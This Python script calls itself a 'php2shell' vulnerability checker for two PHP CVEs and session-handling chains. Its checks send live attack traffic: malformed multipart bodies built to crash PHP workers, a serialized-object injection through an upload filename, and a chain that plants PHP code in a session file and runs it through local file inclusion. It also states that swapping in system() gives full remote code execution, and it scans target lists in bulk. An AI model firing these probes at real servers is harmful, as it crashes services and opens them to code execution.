#!/usr/bin/env python3
"""
php2shell vulnerability checker
Checks for CVE-2026-109618, CVE-2026-109619 and the php2shell session chains.

Usage:
  python3 php2shellbt.py https://target.com
  python3 php2shellbt.py https://target.com --lfi "/vuln.php?page="
  python3 php2shellbt.py https://target.com --write-path /upload.php --read-path /api/data.php
  python3 php2shellbt.py https://target.com --all --lfi "/vuln.php?page=" --session-path /tmp/sessions/sess_
"""

import argparse
import random
import re
import string
import sys
import urllib.request
import urllib.parse
import ssl
import json
from functools import lru_cache
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlsplit, urlunsplit

# ── constants (merged from scanner.py) ───────────────────────────────────────

NESTED_KEYS = 62
PROBES = ((1, 4000), (8, 1020), (20, 1020))
CONTROL_BOUNDARY = "x"
CONTROL_BODY = b"--x\nContent-Disposition:name=a;filename=\n\n"
PROBE_BOUNDARY = ""
REJECTED_STATUSES = {400, 403, 411, 413, 414, 417, 422, 429, 431}
FIXED_VERSIONS = {(8, 2): 35, (8, 3): 36, (8, 4): 27, (8, 5): 12}
VERSION_PATTERN = re.compile(r"PHP/(\d+)\.(\d+)\.(\d+)")
PHPMYADMIN_PATH = "/show_config_errors.php"
PHPMYADMIN_MARKER = b"phpMyAdmin"
BODY_READ_LIMIT = 1 << 20  # 1 MiB

# ── helpers ───────────────────────────────────────────────────────────────────

RESET  = "\033[0m"
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"

def rand_base(n=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def color(text, c): return f"{c}{text}{RESET}"
def ok(msg):   print(color(f"[+] {msg}", GREEN))
def warn(msg): print(color(f"[!] {msg}", YELLOW))
def err(msg):  print(color(f"[-] {msg}", RED))
def info(msg): print(color(f"[*] {msg}", CYAN))


def request(url, method="GET", data=None, headers=None, timeout=10):
    """Returns (status, headers_dict, body_bytes). body is bytes, None on network error."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    req = urllib.request.Request(url, data=data, method=method)
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    req.add_header("User-Agent", "Mozilla/5.0 php2shell-checker/1.0")

    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read(BODY_READ_LIMIT)
            resp_headers = dict(r.headers)
            status = r.status
    except urllib.error.HTTPError as e:
        body = e.read(BODY_READ_LIMIT)
        resp_headers = dict(e.headers)
        status = e.code
    except Exception as e:
        return None, {}, str(e).encode()

    return status, resp_headers, body


def multipart_body(boundary, fields):
    """Build a raw multipart/form-data body."""
    lines = []
    for name, value, filename, ctype in fields:
        lines.append(f"------{boundary}".encode())
        if filename:
            lines.append(
                f'Content-Disposition: form-data; name="{name}"; filename="{filename}"'.encode()
            )
            lines.append(f"Content-Type: {ctype}".encode())
        else:
            lines.append(f'Content-Disposition: form-data; name="{name}"'.encode())
        lines.append(b"")
        lines.append(value.encode() if isinstance(value, str) else value)
    lines.append(f"------{boundary}--".encode())
    return b"\r\n".join(lines)


def as_bytes(value) -> bytes:
    if isinstance(value, bytes):
        return value
    if isinstance(value, str):
        return value.encode("utf-8", errors="replace")
    return b""


def as_str(value) -> str:
    if isinstance(value, bytes):
        return value.decode("utf-8", errors="replace")
    return value or ""


def get_header(headers: dict, name: str) -> str:
    return headers.get(name) or headers.get(name.lower()) or ""


# ── probe building & verdict logic (from scanner.py) ─────────────────────────

@lru_cache(maxsize=len(PROBES))
def build_probe_body(size_mib: int, parts: int) -> bytes:
    """Build a large malformed multipart body with deeply nested array keys."""
    size = size_mib << 20
    name = b"a[]" + (b"[a]" * NESTED_KEYS)
    part = b"--\nContent-Disposition:name=" + name + b";filename=\n\n"
    base = part * parts
    if size < len(base):
        raise ValueError(
            f"php2shell probe of {size} bytes cannot hold {parts} parts ({len(base)} bytes)"
        )
    filler = (size - len(base)) // 3
    body = b"--\n" + (b"x:\n" * filler) + base[3:]
    return body[:-1]


def version_verdict(powered_by: str) -> Optional[str]:
    """Return 'FIXED', 'VULNERABLE', or None if version unknown/not in patch table."""
    match = VERSION_PATTERN.search(powered_by)
    if not match:
        return None
    major, minor, patch = (int(v) for v in match.groups())
    fixed_patch = FIXED_VERSIONS.get((major, minor))
    if fixed_patch is None:
        return None
    return "FIXED" if patch >= fixed_patch else "VULNERABLE"


def crash_signal(
    ctrl_status: Optional[int],
    ctrl_body: bytes,
    probe_status: Optional[int],
    probe_body: bytes,
    sapi: str,
) -> Tuple[Optional[str], Optional[str]]:
    """Detect crash signals by comparing probe vs control response."""
    if (
        b"Allowed memory size of " in probe_body
        and b" bytes exhausted" in probe_body
        and b"Unknown" in probe_body
    ):
        mode = (
            "PHP-FPM" if sapi == "fpm"
            else "mod_php" if sapi == "mod_php"
            else "mod_php/PHP-FPM"
        )
        return (
            mode,
            "in-band PHP fatal error (memory exhausted in Unknown) while parsing multipart body",
        )

    if probe_status == 500 and ctrl_body and not probe_body:
        mode = (
            "PHP-FPM" if sapi == "fpm"
            else "mod_php" if sapi == "mod_php"
            else "mod_php/PHP-FPM"
        )
        return (
            mode,
            "HTTP 500 with empty body although the control request produced output",
        )

    if sapi == "mod_php":
        return None, None

    if probe_status in (502, 503, 504):
        return (
            "PHP-FPM",
            f"HTTP {probe_status} from the web server fronting PHP-FPM (worker died mid-request)",
        )
    if probe_status == 200 and ctrl_body and not probe_body:
        return (
            "PHP-FPM",
            "HTTP 200 with empty body although the control request produced output (worker died mid-request)",
        )
    return None, None


# ── checks ────────────────────────────────────────────────────────────────────

def check_php_fingerprint(base_url, timeout=10):
    """CVE-2026-109619 — version fingerprint via X-Powered-By."""
    print()
    info("CHECK 1 — CVE-2026-109619: PHP version fingerprint (var_destroy UAF)")
    status, headers, body = request(base_url, timeout=timeout)
    if status is None:
        err(f"Request failed: {as_str(body)}")
        return False

    xpb = get_header(headers, "X-Powered-By")
    match = VERSION_PATTERN.search(xpb)

    if not match:
        warn("X-Powered-By header not present or does not expose PHP version.")
        warn("Site may not be PHP or header is hidden — CVE-2026-109619 inconclusive.")
        return False

    version = match.group(0).replace("PHP/", "")
    parts = tuple(int(x) for x in version.split("."))
    info(f"PHP version detected: {BOLD}{version}{RESET}")

    verdict = version_verdict(xpb)
    if verdict == "VULNERABLE":
        major = parts[0]
        if major == 5:
            warn(f"PHP {version} (5.x): Sury backported packages may carry the fix.")
            warn("  Sury 5.6.40-104+ ships the patches — verify the package version manually.")
        ok(f"VULNERABLE — PHP {version} is in the affected range for CVE-2026-109619.")
        ok("  Impact: var_destroy use-after-free reachable via unserialize() + destructor gadget.")
        return True
    elif verdict == "FIXED":
        info(f"PHP {version} is a patched release.")
        return False
    else:
        warn(f"PHP {version} branch not in known patch table — cannot determine status.")
        return False


def check_crash_probe(base_url, sapi="auto", timeout=60):
    """
    CVE-2026-109618/109619 — crash-probe detection (main method from scanner.py).
    Sends a control request, then large malformed multipart probes, and looks
    for crash signals in the difference between responses.
    Returns (vulnerable: bool, final_url: str).
    """
    print()
    info("CHECK 2 — CVE-2026-109618/109619: multipart crash-probe detection")
    target_url = base_url

    # Control request — minimal valid multipart
    info("  Sending control request...")
    ctrl_status, ctrl_hdrs, ctrl_body = request(
        target_url, method="POST",
        data=CONTROL_BODY,
        headers={
            "Content-Type": f"multipart/form-data; boundary={CONTROL_BOUNDARY}",
            "Content-Length": str(len(CONTROL_BODY)),
        },
        timeout=timeout,
    )
    if ctrl_status is None:
        err(f"Control request failed: {as_str(ctrl_body)}")
        return False, target_url

    if ctrl_status >= 500:
        warn(f"Control request returned HTTP {ctrl_status} — target may already be unstable.")
        return False, target_url

    # phpMyAdmin auto-detection → retarget to show_config_errors.php
    if PHPMYADMIN_MARKER in as_bytes(ctrl_body):
        parsed = urlsplit(target_url)
        target_url = urlunsplit((parsed.scheme, parsed.netloc, PHPMYADMIN_PATH, "", ""))
        info(f"  phpMyAdmin detected — retargeting to {target_url}")
        ctrl_status, ctrl_hdrs, ctrl_body = request(
            target_url, method="POST",
            data=CONTROL_BODY,
            headers={
                "Content-Type": f"multipart/form-data; boundary={CONTROL_BOUNDARY}",
                "Content-Length": str(len(CONTROL_BODY)),
            },
            timeout=timeout,
        )
        if ctrl_status is None:
            err(f"phpMyAdmin control request failed: {as_str(ctrl_body)}")
            return False, target_url

    powered_by = get_header(ctrl_hdrs, "X-Powered-By")
    ctrl_body_b = as_bytes(ctrl_body)

    # Pre-cache all probe bodies before the scan loop
    for probe in PROBES:
        build_probe_body(*probe)

    for index, (size_mib, parts) in enumerate(PROBES, start=1):
        info(f"  Probe {index}/{len(PROBES)}: {size_mib} MiB, {parts} parts, {NESTED_KEYS} nested keys...")
        try:
            probe_data = build_probe_body(size_mib, parts)
        except ValueError as exc:
            warn(f"  Probe {index} build failed: {exc}")
            continue

        probe_status, probe_hdrs, probe_body = request(
            target_url, method="POST",
            data=probe_data,
            headers={
                "Content-Type": f"multipart/form-data; boundary={PROBE_BOUNDARY}",
                "Content-Length": str(len(probe_data)),
            },
            timeout=timeout,
        )

        # Update X-Powered-By from probe response if available
        pb = get_header(probe_hdrs, "X-Powered-By")
        if pb:
            powered_by = pb

        if probe_status is None:
            warn(f"  Probe {index} failed to get a response: {as_str(probe_body)}")
            info("  (network error during probe could indicate a crash — treat as inconclusive)")
            continue

        if probe_status in REJECTED_STATUSES:
            warn(f"  Probe {index} rejected with HTTP {probe_status} — WAF/proxy body size limit.")
            break

        detected_sapi, signal = crash_signal(
            ctrl_status, ctrl_body_b,
            probe_status, as_bytes(probe_body),
            sapi,
        )
        if signal:
            ok(f"VULNERABLE — probe {index} ({size_mib} MiB, {parts} parts) crashed the request handler!")
            ok(f"  SAPI: {detected_sapi}")
            ok(f"  Signal: {signal}")
            ok("  CVE-2026-109618 / CVE-2026-109619 confirmed.")
            return True, target_url

        # Early exit if version reports fixed
        if powered_by and version_verdict(powered_by) == "FIXED":
            info(f"  No crash on probe {index} and X-Powered-By reports patched release: {powered_by}")
            return False, target_url

    # Post-loop version check
    if powered_by:
        verdict = version_verdict(powered_by)
        if verdict == "VULNERABLE":
            warn(f"  No crash signal observed but X-Powered-By reports unpatched release: {powered_by}")
            warn("  Crash may have been masked by error suppression — verify manually.")
        elif verdict == "FIXED":
            info(f"  No crash observed and X-Powered-By reports patched release: {powered_by}")
        else:
            info(f"  No crash signal. X-Powered-By: {powered_by}")
    else:
        info("  No crash signal detected and no PHP version advertised.")

    return False, target_url


def check_session_fixation(base_url, timeout=10):
    """CVE-2026-109618 — session upload_progress warning-based indicator check."""
    print()
    info("CHECK 2b — CVE-2026-109618: session.upload_progress warning indicators (display_errors=On)")

    marker   = rand_base(12)
    sid_bad  = f"nuclei/{rand_base(20)}"
    boundary = f"NucleiCVE{marker}"

    fields = [
        ("PHPSESSID",                   sid_bad,  None,              ""),
        ("PHP_SESSION_UPLOAD_PROGRESS", marker,   None,              ""),
        ("f",                           "Z",       f"{marker}.txt",  "text/plain"),
    ]
    body_bytes = multipart_body(boundary, fields)
    hdrs = {
        "Content-Type": f"multipart/form-data; boundary=----{boundary}",
        "Content-Length": str(len(body_bytes)),
    }

    status, resp_headers, body = request(base_url, method="POST",
                                          data=body_bytes, headers=hdrs, timeout=timeout)
    if status is None:
        err(f"Request failed: {as_str(body)}")
        return False

    body_str = as_str(body)
    indicator_a = "Session ID is too long or contains illegal characters" in body_str
    indicator_b = ("Failed to read session data" in body_str or
                   "PHP Request Startup" in body_str)

    if indicator_a and indicator_b:
        ok("VULNERABLE — PHP printed session-startup warnings, confirming upload_progress UAF/OOM path.")
        ok("  CVE-2026-109618: use-after-free / OOM triggered via upload_progress error path.")
        ok("  Chain: upload_progress injection → session file write → LFI → RCE (if cleanup=Off).")
        return True
    elif indicator_a:
        warn("Partial match — session ID warning triggered but no startup error visible.")
        warn("display_errors may be Off. Vulnerability may still exist — check via crash-probe.")
        return False
    else:
        info("No CVE-2026-109618 warning indicators found.")
        info("(display_errors=Off hides warnings even on vulnerable hosts — see CHECK 2 results.)")
        return False


def check_handler_mismatch(base_url, write_path, read_path, timeout=10, _quiet=False):
    """php2shell handler mismatch — session deserializer confusion."""
    if not _quiet:
        print()
        info("CHECK 3 — php2shell-handler-mismatch: session.serialize_handler confusion")
    info(f"  write_path = {write_path}  |  read_path = {read_path}")

    marker = rand_base(10)
    sid    = f"nuclei{rand_base(24)}"

    # Request 1: write a serialized object via php_serialize endpoint
    boundary_w = f"NucleiWrite{marker}"
    fields_w = [
        ("PHPSESSID",                   sid,    None,                        ""),
        ("PHP_SESSION_UPLOAD_PROGRESS", marker, None,                        ""),
        ("f",                           "Z",    f'x|O:8:"stdClass":0:{{}}',  "text/plain"),
    ]
    body_w = multipart_body(boundary_w, fields_w)
    hdrs_w = {
        "Content-Type": f"multipart/form-data; boundary=----{boundary_w}",
        "Content-Length": str(len(body_w)),
        "Cookie": f"PHPSESSID={sid}",
    }

    write_url = base_url.rstrip("/") + write_path
    status_w, _, body_w_resp = request(write_url, method="POST",
                                        data=body_w, headers=hdrs_w, timeout=timeout)
    if status_w is None:
        err(f"Write request failed: {as_str(body_w_resp)}")
        return False

    # Request 2: read session with php (non-serialize) endpoint to trigger deserializer confusion
    boundary_r = f"NucleiRead{marker}"
    fields_r = [
        ("PHPSESSID",                   sid,     None,         ""),
        ("PHP_SESSION_UPLOAD_PROGRESS", marker,  None,         ""),
        ("f",                           "Z",      "dummy.txt", "text/plain"),
    ]
    body_r = multipart_body(boundary_r, fields_r)
    hdrs_r = {
        "Content-Type": f"multipart/form-data; boundary=----{boundary_r}",
        "Content-Length": str(len(body_r)),
        "Cookie": f"PHPSESSID={sid}",
    }

    read_url = base_url.rstrip("/") + read_path
    status_r, _, body_r_resp = request(read_url, method="POST",
                                        data=body_r, headers=hdrs_r, timeout=timeout)
    if status_r is None:
        err(f"Read request failed: {as_str(body_r_resp)}")
        return False

    body_r_str = as_str(body_r_resp)
    indicator_a = "Failed to decode session object" in body_r_str
    indicator_b = "Session object destruction failed" in body_r_str

    if indicator_a or indicator_b:
        ok("VULNERABLE — handler mismatch deserialization error detected!")
        ok("  Destructor fires during error path — POP gadget can yield RCE.")
        ok("  Related CVE: CVE-2026-109618 / CVE-2026-109619.")
        return True
    else:
        info("No handler-mismatch indicators found.")
        info("Requires display_errors=On and endpoints with different serialize_handler settings.")
        return False


def check_session_lfi(base_url, lfi_path, session_save_path, timeout=10, _quiet=False):
    """php2shell session injection + LFI chain."""
    if not _quiet:
        print()
        info("CHECK 4 — php2shell-session-injection-lfi: session file injection + LFI")
    info(f"  lfi_path     = {lfi_path}")
    info(f"  session_path = {session_save_path}")

    marker = f"NUCLEI{rand_base(10)}"
    sid    = f"nuclei{rand_base(24)}"

    upload_boundary = f"Nuclei{marker}"
    php_payload = f"<?php echo '{marker}'; ?>"
    fields = [
        ("PHPSESSID",                   sid,    None,         ""),
        ("PHP_SESSION_UPLOAD_PROGRESS", marker, None,         ""),
        ("f",                           "Z",     php_payload, "text/plain"),
    ]
    body_bytes = multipart_body(upload_boundary, fields)
    hdrs = {
        "Content-Type": f"multipart/form-data; boundary=----{upload_boundary}",
        "Content-Length": str(len(body_bytes)),
        "Cookie": f"PHPSESSID={sid}",
    }

    status1, _, body1 = request(base_url, method="POST", data=body_bytes, headers=hdrs, timeout=timeout)
    if status1 is None:
        err(f"Upload request failed: {as_str(body1)}")
        return False

    session_file = f"{session_save_path}{sid}"
    lfi_url = base_url.rstrip("/") + lfi_path + urllib.parse.quote(session_file)
    status2, _, body2 = request(lfi_url, timeout=timeout)
    if status2 is None:
        err(f"LFI request failed: {as_str(body2)}")
        return False

    if marker in as_str(body2):
        ok("VULNERABLE — marker echoed back through LFI!")
        ok(f"  PHP payload in session file was executed: {php_payload}")
        ok("  Full RCE achievable by replacing echo with system()/passthru().")
        return True
    else:
        info("Marker not found in LFI response.")
        info("LFI path may be wrong, session.upload_progress.cleanup=On, or use_strict_mode=On.")
        return False


# ── summary ───────────────────────────────────────────────────────────────────

def print_banner(target):
    print(color("""
╔══════════════════════════════════════════════════════════════╗
║           php2shell vulnerability checker                    ║
║  CVE-2026-109618 · CVE-2026-109619 · handler-mismatch · LFI ║
╚══════════════════════════════════════════════════════════════╝""", CYAN))
    print(f"  Target : {BOLD}{target}{RESET}")
    print()

def print_summary(results):
    print()
    print(color("══════════════ RESULTS ══════════════", BOLD))
    labels = {
        "cve109619":      "CVE-2026-109619 (version fingerprint / var_destroy UAF)",
        "cve109618_crash": "CVE-2026-109618/109619 (crash-probe — main detection)",
        "cve109618_warn":  "CVE-2026-109618 (session upload_progress warnings)",
        "handler":        "php2shell handler mismatch object injection",
        "session_lfi":    "php2shell session injection + LFI chain",
    }
    found = 0
    for key, label in labels.items():
        if key not in results:
            continue
        v = results[key]
        if v is True:
            print(f"  {GREEN}VULNERABLE{RESET}  {label}")
            found += 1
        elif v is False:
            print(f"  {YELLOW}NOT FOUND {RESET}  {label}")
        else:
            print(f"  {YELLOW}SKIPPED   {RESET}  {label}")
    print()
    if found:
        print(color(f"  ⚠  {found} vulnerability/ies confirmed — remediate immediately.", RED + BOLD))
    else:
        print(color("  ✓  No php2shell vulnerabilities confirmed.", GREEN))
    print()


# ── scan orchestration ────────────────────────────────────────────────────────

def scan_target(target, args):
    """Run all configured checks against a single target. Returns results dict."""
    print_banner(target)
    results = {}

    # Check 1: version fingerprint
    results["cve109619"] = check_php_fingerprint(target, timeout=args.timeout)

    # Check 2: crash-probe (main detection method, from scanner.py)
    crash_vuln, final_url = check_crash_probe(target, sapi=args.sapi, timeout=args.probe_timeout)
    results["cve109618_crash"] = crash_vuln

    # Check 2b: warning-indicator fallback (only useful with display_errors=On)
    results["cve109618_warn"] = check_session_fixation(target, timeout=args.timeout)

    # Check 3: handler mismatch
    handler_pairs = getattr(args, '_handler_pairs', None)
    run_handler = args.all or handler_pairs or (
        args.write_path != "/app/upload.php" or args.read_path != "/api/endpoint.php"
    )
    if run_handler:
        pairs = handler_pairs or [(args.write_path, args.read_path)]
        print()
        info(f"CHECK 3 — php2shell-handler-mismatch: testing {len(pairs)} path pair(s)")
        hit = False
        for wp, rp in pairs:
            r = check_handler_mismatch(target, wp, rp, timeout=args.timeout, _quiet=True)
            if r:
                hit = True
                break
        results["handler"] = hit
    else:
        print()
        info("CHECK 3 — handler mismatch: SKIPPED (use --all or --handler-pairs to enable)")
        results["handler"] = None

    # Check 4: session LFI
    lfi_paths     = getattr(args, '_lfi_paths', None)
    session_paths = getattr(args, '_session_paths', None)
    run_lfi = lfi_paths or args.lfi
    if run_lfi:
        lfis  = lfi_paths or [args.lfi]
        sesps = session_paths or [args.session_path]
        total_combos = len(lfis) * len(sesps)
        print()
        info(f"CHECK 4 — session-injection-lfi: testing {total_combos} combination(s) "
             f"({len(lfis)} LFI path(s) x {len(sesps)} session path(s))")
        hit = False
        for lp in lfis:
            if hit:
                break
            for sp in sesps:
                r = check_session_lfi(target, lp, sp, timeout=args.timeout, _quiet=True)
                if r:
                    hit = True
                    break
        results["session_lfi"] = hit
    else:
        print()
        info("CHECK 4 — session injection LFI: SKIPPED (use --lfi or --lfi-list to enable)")
        results["session_lfi"] = None

    return results


# ── CLI ───────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="php2shell checker — CVE-2026-109618/109619 and session chains",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  Single target:
    python3 php2shellbt.py https://target.com

  Multiple targets from file:
    python3 php2shellbt.py --targets targets.txt

  With LFI (adds check 4):
    python3 php2shellbt.py https://target.com --lfi "/vuln.php?page=" --session-path /tmp/sessions/sess_

  With handler-mismatch paths (adds check 3):
    python3 php2shellbt.py https://target.com --write-path /upload.php --read-path /api/data.php

  Full suite against a list:
    python3 php2shellbt.py --targets targets.txt --all \\
      --lfi "/vuln.php?page=" --session-path /tmp/sessions/sess_ \\
      --write-path /upload.php --read-path /api/data.php

  Force FPM crash signal rules:
    python3 php2shellbt.py https://target.com --sapi fpm --probe-timeout 90
""")
    parser.add_argument("target", nargs="?",
                        help="Base URL of a single target (e.g. https://example.com)")
    parser.add_argument("--targets", metavar="FILE",
                        help="Text file with one target URL per line")
    parser.add_argument("--all", action="store_true",
                        help="Run all checks (enables checks 3 and 4 with provided paths)")
    parser.add_argument("--lfi", metavar="PATH",
                        help='Single LFI parameter path, e.g. "/vuln.php?page="')
    parser.add_argument("--lfi-list", metavar="FILE",
                        help="File with one LFI path per line (tries each, stops on first hit)")
    parser.add_argument("--session-path", metavar="PATH", default="/tmp/sessions/sess_",
                        help="PHP session save path prefix (default: /tmp/sessions/sess_)")
    parser.add_argument("--session-paths-list", metavar="FILE",
                        help="File with one session save path prefix per line")
    parser.add_argument("--write-path", metavar="PATH", default="/app/upload.php",
                        help="Endpoint with session.serialize_handler=php_serialize")
    parser.add_argument("--read-path", metavar="PATH", default="/api/endpoint.php",
                        help="Endpoint with session.serialize_handler=php")
    parser.add_argument("--handler-pairs", metavar="FILE",
                        help="File with write_path,read_path pairs (one per line) for check 3")
    parser.add_argument("--timeout", type=int, default=10,
                        help="Request timeout in seconds for light requests (default: 10)")
    parser.add_argument("--probe-timeout", type=int, default=60,
                        help="Timeout for large crash-probe requests in seconds (default: 60)")
    parser.add_argument("--sapi", choices=("auto", "mod_php", "fpm"), default="auto",
                        help="SAPI mode for crash signal interpretation (default: auto)")
    parser.add_argument("--json", action="store_true",
                        help="Output results as JSON")
    args = parser.parse_args()

    # Build target list
    targets = []
    if args.targets:
        try:
            with open(args.targets, "r", encoding="utf-8") as fh:
                for line in fh:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        targets.append(line.rstrip("/"))
        except OSError as e:
            err(f"Cannot read targets file: {e}")
            sys.exit(2)
        if not targets:
            err("Targets file is empty or contains only comments.")
            sys.exit(2)
    elif args.target:
        targets.append(args.target.rstrip("/"))
    else:
        parser.error("Provide a target URL or --targets FILE")

    def _load_lines(path):
        try:
            with open(path, "r", encoding="utf-8") as fh:
                return [l.strip() for l in fh if l.strip() and not l.startswith("#")]
        except OSError as e:
            err(f"Cannot read file {path}: {e}")
            sys.exit(2)

    if args.lfi_list:
        args._lfi_paths = _load_lines(args.lfi_list)
        info(f"LFI list loaded: {len(args._lfi_paths)} path(s)")
    elif args.lfi:
        args._lfi_paths = [args.lfi]
    else:
        args._lfi_paths = None

    if args.session_paths_list:
        args._session_paths = _load_lines(args.session_paths_list)
        info(f"Session-paths list loaded: {len(args._session_paths)} path(s)")
    else:
        args._session_paths = None

    if args.handler_pairs:
        raw_pairs = _load_lines(args.handler_pairs)
        args._handler_pairs = []
        for line in raw_pairs:
            if ',' in line:
                wp, rp = line.split(',', 1)
                args._handler_pairs.append((wp.strip(), rp.strip()))
        info(f"Handler pairs loaded: {len(args._handler_pairs)} pair(s)")
    else:
        args._handler_pairs = None

    all_results = {}
    any_vuln = False

    for i, target in enumerate(targets, 1):
        if len(targets) > 1:
            print(color(f"\n{'━'*62}", CYAN))
            print(color(f"  TARGET {i}/{len(targets)}: {target}", BOLD))
            print(color(f"{'━'*62}", CYAN))

        results = scan_target(target, args)
        all_results[target] = results
        if any(v is True for v in results.values()):
            any_vuln = True

        if args.json:
            out = {k: ("VULNERABLE" if v is True else "NOT_FOUND" if v is False else "SKIPPED")
                   for k, v in results.items()}
            print(json.dumps({"target": target, "results": out}, indent=2))
        else:
            print_summary(results)

    if len(targets) > 1 and not args.json:
        print(color("══════════════ MULTI-TARGET SUMMARY ══════════════", BOLD))
        for t, res in all_results.items():
            vuln_count = sum(1 for v in res.values() if v is True)
            status = color("VULNERABLE", RED + BOLD) if vuln_count else color("CLEAN", GREEN)
            print(f"  {status}  {t}  ({vuln_count} finding(s))")
        print()

    if len(targets) > 1 and args.json:
        combined = {
            t: {k: ("VULNERABLE" if v is True else "NOT_FOUND" if v is False else "SKIPPED")
                for k, v in res.items()}
            for t, res in all_results.items()
        }
        print(json.dumps({"targets": combined}, indent=2))

    sys.exit(1 if any_vuln else 0)


if __name__ == "__main__":
    main()
